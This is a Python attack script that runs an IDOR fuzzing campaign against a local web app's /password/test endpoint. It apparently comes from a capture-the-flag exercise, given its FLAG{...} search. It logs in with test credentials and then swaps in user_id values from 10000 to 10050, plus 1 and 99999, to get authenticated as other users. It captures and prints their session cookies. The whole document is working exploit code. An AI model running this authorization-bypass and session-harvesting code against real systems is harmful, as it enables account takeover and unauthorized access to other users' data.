import requests
import re
import time

# Configuration
target_url = "http://127.0.0.1"
base_url = f"{target_url}"
password_test_url = f"{target_url}/password/test"

# Test credentials
credentials = {
    'username': 'test',
    'password': 'test'
}

# Test range for user_id (10000-10050 inclusive)
test_range = range(10000, 10051)

# Results tracking
successful_auths = []
flag_found = None
interesting_responses = []

print("="*80)
print("IDOR FUZZING CAMPAIGN - /password/test endpoint")
print(f"Target: {target_url}")
print(f"Testing user_id range: {test_range.start}-{test_range.stop-1}")
print(f"Credentials: test:test")
print("="*80)

for user_id in test_range:
    try:
        # Create a fresh session for each test
        session = requests.Session()
        
        # Step 1: Authenticate with test credentials
        print(f"\n[+] Testing user_id: {user_id}")
        print(f"  [1] POST / with credentials...")
        
        auth_response = session.post(
            target_url,
            data=credentials,
            allow_redirects=False
        )
        
        print(f"      Auth Status: {auth_response.status_code}")
        
        # Check if we got a session cookie
        session_cookies = session.cookies.get_dict()
        if 'session' in session_cookies:
            print(f"      Session cookie received: {session_cookies['session'][:50]}...")
        
        # Step 2: POST to /password/test with modified user_id
        print(f"  [2] POST /password/test with user_id={user_id}...")
        
        # Prepare the data with modified user_id
        test_data = {
            'username': 'test',
            'password': 'test',
            'user_id': str(user_id)  # Inject the test user_id
        }
        
        test_response = session.post(
            password_test_url,
            data=test_data,
            allow_redirects=False
        )
        
        # Analyze response
        status = test_response.status_code
        content_length = len(test_response.content)
        response_text = test_response.text
        
        print(f"      Response Status: {status}")
        print(f"      Content Length: {content_length} bytes")
        
        # Check for session cookie in response
        response_session = session.cookies.get('session')
        if response_session:
            print(f"      Session: {response_session}")
        
        # Search for FLAG pattern
        flag_match = re.search(r'FLAG\{[^}]+\}', response_text)
        if flag_match:
            flag_found = flag_match.group(0)
            print(f"\n[!] FLAG FOUND: {flag_found}")
            print(f"[!] Found at user_id: {user_id}")
            print(f"[!] Full response:\n{response_text}")
            break  # Stop immediately if flag found
        
        # Check for successful authentication indicators
        if status == 200:
            # Check if we got a valid session cookie indicating successful auth
            if response_session and len(response_session) > 50:  # Valid session cookies are typically long
                successful_auths.append({
                    'user_id': user_id,
                    'status': status,
                    'session': response_session,
                    'response_snippet': response_text[:200]
                })
                print(f"      [SUCCESS] Authentication succeeded with user_id={user_id}")
                print(f"      Session cookie: {response_session}")
        
        # Check for interesting error messages or patterns
        if status != 200 or 'error' in response_text.lower() or 'invalid' in response_text.lower():
            interesting_responses.append({
                'user_id': user_id,
                'status': status,
                'response': response_text[:300]
            })
            if 'error' in response_text.lower() or 'invalid' in response_text.lower():
                print(f"      Response: {response_text[:200]}")
        
        # Rate limiting - small delay between requests
        time.sleep(0.1)
        
    except Exception as e:
        print(f"  [ERROR] Exception for user_id {user_id}: {str(e)}")
        continue

# Summary
print("\n" + "="*80)
print("CAMPAIGN SUMMARY")
print("="*80)

if flag_found:
    print(f"[!] FLAG FOUND: {flag_found}")
    print(f"[!] Campaign stopped at user_id: {user_id}")
elif successful_auths:
    print(f"[+] Successful authentications found: {len(successful_auths)}")
    for auth in successful_auths:
        print(f"  - user_id: {auth['user_id']}")
        if auth['user_id'] != 10032:
            print(f"    [!] NON-LEGITIMATE USER ID AUTHENTICATED!")
else:
    print("[-] No successful authentications found in test range")

# Test extreme values if no flag was found
if not flag_found:
    print("\n" + "="*80)
    print("TESTING EXTREME VALUES")
    print("="*80)
    
    extreme_values = [1, 99999]
    
    for extreme_id in extreme_values:
        try:
            print(f"\n[+] Testing extreme user_id: {extreme_id}")
            
            session = requests.Session()
            
            # Auth step
            auth_response = session.post(target_url, data=credentials)
            
            # Test step
            test_data = {
                'username': 'test',
                'password': 'test',
                'user_id': str(extreme_id)
            }
            
            test_response = session.post(password_test_url, data=test_data)
            
            status = test_response.status_code
            content = test_response.text
            
            print(f"  Status: {status}")
            print(f"  Response: {content[:200]}")
            
            # Check for flag
            flag_match = re.search(r'FLAG\{[^}]+\}', content)
            if flag_match:
                flag_found = flag_match.group(0)
                print(f"\n[!] FLAG FOUND: {flag_found}")
                print(f"[!] At extreme user_id: {extreme_id}")
                break
            
            # Check for successful auth
            if status == 200 and 'session' in session.cookies:
                session_cookie = session.cookies['session']
                if len(session_cookie) > 50:
                    successful_auths.append({
                        'user_id': extreme_id,
                        'status': status,
                        'session': session_cookie
                    })
                    print(f"  [SUCCESS] Auth succeeded with extreme user_id={extreme_id}")
            
        except Exception as e:
            print(f"  [ERROR] Exception for extreme user_id {extreme_id}: {str(e)}")

# Final report
print("\n" + "="*80)
print("FINAL REPORT")
print("="*80)

if flag_found:
    print(f"[!] FLAG FOUND: {flag_found}")
    print(f"[!] VULNERABILITY EXPLOITED SUCCESSFULLY!")
elif successful_auths:
    print(f"[+] IDOR VULNERABILITY CONFIRMED!")
    print(f"[+] Successful authentications with non-legitimate user IDs:")
    for auth in successful_auths:
        if auth['user_id'] != 10032:
            print(f"  - user_id={auth['user_id']} (NON-LEGITIMATE)")
    print(f"\n[+] All successful auths:")
    for auth in successful_auths:
        print(f"  - user_id={auth['user_id']}")
else:
    print("[-] No successful exploitation found")
    print("[-] IDOR may not be present or requires different approach")

print("\n" + "="*80)
